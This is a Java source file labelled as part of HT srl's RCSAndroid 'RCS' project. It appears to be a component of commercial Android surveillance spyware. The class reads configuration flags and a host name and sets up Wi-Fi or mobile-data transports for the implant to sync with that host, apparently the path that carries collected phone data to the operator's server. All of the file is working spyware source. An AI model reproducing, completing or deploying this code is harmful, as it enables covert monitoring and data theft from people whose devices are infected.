/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSAndroid
 * File         : SyncActionInternet.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/
package com.ht.RCSAndroidGUI.action;

import java.io.IOException;

import android.util.Log;

import com.ht.RCSAndroidGUI.action.sync.GprsTransport;
import com.ht.RCSAndroidGUI.action.sync.WifiTransport;
import com.ht.RCSAndroidGUI.util.DataBuffer;
import com.ht.RCSAndroidGUI.util.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class SyncActionInternet.
 */
public class SyncActionInternet extends SyncAction {

	private static final String TAG = "SyncActionInternet";

	/** The wifi forced. */
	protected boolean wifiForced;

	/** The wifi. */
	protected boolean wifi;

	/** The gprs. */
	protected boolean gprs;

	/** The host. */
	String host;

	/**
	 * Instantiates a new sync action internet.
	 * 
	 * @param type
	 *            the type
	 * @param confParams
	 *            the conf params
	 */
	public SyncActionInternet(final int type, final byte[] confParams) {
		super(type, confParams);
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.action.SyncAction#parse(byte[])
	 */
	@Override
	protected boolean parse(final byte[] confParams) {
		final DataBuffer databuffer = new DataBuffer(confParams, 0,
				confParams.length);

		try {
			gprs = databuffer.readInt() == 1;
			wifi = databuffer.readInt() == 1;

			final int len = databuffer.readInt();
			final byte[] buffer = new byte[len];
			databuffer.read(buffer);

			host = WChar.getString(buffer, true);

		} catch (final IOException e) {
			Log.d(TAG,"Error: params FAILED");
			return false;
		}
		final StringBuffer sb = new StringBuffer();
		sb.append("gprs: " + gprs);
		sb.append(" wifi: " + wifi);
		sb.append(" wifiForced: " + wifiForced);
		sb.append(" host: " + host);
		Log.d(TAG,sb.toString());
		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.RCSAndroidGUI.action.SyncAction#initTransport()
	 */
	@Override
	protected boolean initTransport() {
		if (wifi) {
			Log.d("QZ", TAG + "initTransport adding WifiTransport");
			transports.addElement(new WifiTransport(host, wifiForced));
		}

		if (gprs) {
			Log.d("QZ", TAG + "initTransport adding DirectTransport");
			transports.addElement(new GprsTransport(host));
		}

		return true;
	}

}
